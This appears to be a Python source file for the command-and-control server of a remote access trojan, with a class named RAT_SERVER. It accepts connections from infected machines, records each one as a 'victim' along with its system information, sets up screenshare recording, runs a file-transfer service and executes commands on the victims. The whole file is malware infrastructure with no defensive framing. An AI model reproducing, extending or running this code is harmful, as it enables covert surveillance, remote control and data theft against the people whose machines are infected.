from fastapi import UploadFile
import socket
import select
import threading
import os
import uuid
from PIL import Image

from host.modules.screenshare import ScreenShareManager
from host.service.utilities import gatherInfoOutput, executeCommands
from host.service.classManager import SingletonMeta

from host.modules.filetransfer import FileTransferManager


class RAT_SERVER(metaclass=SingletonMeta):
    instance = None  # Class variable to store the instance

    def __init__(self, host, port):
        if not RAT_SERVER.instance:
            RAT_SERVER.instance = self  # Set the instance to this object
            self.host = host
            self.port = port
            self.clients = []  # The connection with the clients
            self.victims = []  # The list of victims

            # Create an instance of FileTransferManager
            self.file_transfer_manager = FileTransferManager(
                "localhost", 4440, self.victims)

            # Start the FileTransferManager in a separate thread
            self.file_transfer_thread = threading.Thread(
                target=self.file_transfer_manager.start_server)
            self.file_transfer_thread.start()

    def build_connection(self):
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.bind((self.host, self.port))
        s.listen(5)
        print("[*] Waiting for clients...")

        while True:
            client, addr = s.accept()
            self.clients.append((client, addr))
            print(f"[*] Connection established with {addr[0]}")

            output = self.receive_output(client)
            output_dict = gatherInfoOutput(output)
            output_dict["socket_ip"] = addr[0]

            random_uuid = str(uuid.uuid4().hex)
            directory = f"data/{output_dict['Name']}/screenshare/{random_uuid}/"
            output_dict["SCREENSHARE_SOURCE"] = f"{directory}video.avi"

            print(f"[*] Adding {output_dict['Name']} to the list of victims")

            for victim in self.victims:
                if victim["Name"] == output_dict["Name"]:
                    self.victims.remove(victim)
            self.victims.append(output_dict)

            self.file_transfer_manager.set_victim_list(self.victims)

    def receive_output(self, client_socket):
        try:
            print("Receiving output")
            ready = select.select([client_socket], [], [], 5)

            if ready[0]:
                try:
                    decoded = client_socket.recv(100024).decode()
                    return decoded
                except:
                    return "Error decoding output"
            else:
                return "Error receiving output"
        except Exception as e:
            print(f"Error receiving output: {str(e)}")

    def execute(self, command_type, command, client_socket):
        executeCommands(command_type, command, client_socket)

    async def transfer_file(self, victim, file: UploadFile):
        await self.file_transfer_manager.upload_file(victim, file)
